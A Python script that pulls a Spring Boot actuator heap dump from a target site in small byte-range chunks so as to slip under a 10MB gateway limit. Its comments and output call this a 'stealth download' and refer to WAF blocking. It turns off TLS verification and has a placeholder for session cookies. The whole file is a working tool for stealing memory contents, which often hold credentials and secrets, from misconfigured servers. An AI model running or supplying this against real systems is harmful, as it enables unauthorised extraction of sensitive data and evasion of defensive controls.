import requests
import os
import sys

# --- CONFIGURATION ---
url = "https://target.com/actuator/heapdump"
# CHANGED: Extension is .hprof because Notepad showed it is NOT gzipped
output_file = "heapdump_clean.hprof" 
# CRITICAL: 512KB chunks to stay under the 10MB Gateway limit
chunk_size = 512 * 1024 

headers = {
    "User-Agent": "Mozilla/5.0",
    # PASTE YOUR COOKIES/AUTH HERE IF NEEDED
    # "Cookie": "JSESSIONID=...", 
}
# ---------------------

current_byte = 0
print(f"[*] Starting Stealth Download to {output_file}...")

with open(output_file, "wb") as f:
    while True:
        range_header = f"bytes={current_byte}-{current_byte + chunk_size - 1}"
        headers["Range"] = range_header
        
        try:
            r = requests.get(url, headers=headers, verify=False, stream=True)
            
            if r.status_code == 206:
                bytes_received = len(r.content)
                
                if bytes_received == 0:
                    print("\n[!] Error: Received 0 bytes. WAF Blocking.")
                    break

                f.write(r.content)
                f.flush()
                current_byte += bytes_received
                
                # Update progress
                sys.stdout.write(f"\r[+] Downloaded: {current_byte / 1024 / 1024:.2f} MB")
                sys.stdout.flush()

                # Check if done
                content_range = r.headers.get("Content-Range", "")
                if "/" in content_range:
                    total_size = int(content_range.split("/")[-1])
                    if current_byte >= total_size:
                        print(f"\n[+] Success! Total size: {current_byte} bytes")
                        break
            
            elif r.status_code == 413:
                print(f"\n[!] 413 Error. 512KB is still too big? Reduce chunk_size.")
                break
                
            else:
                print(f"\n[!] Unexpected Status: {r.status_code}")
                break
                
        except Exception as e:
            print(f"\n[!] Error: {e}")
            break
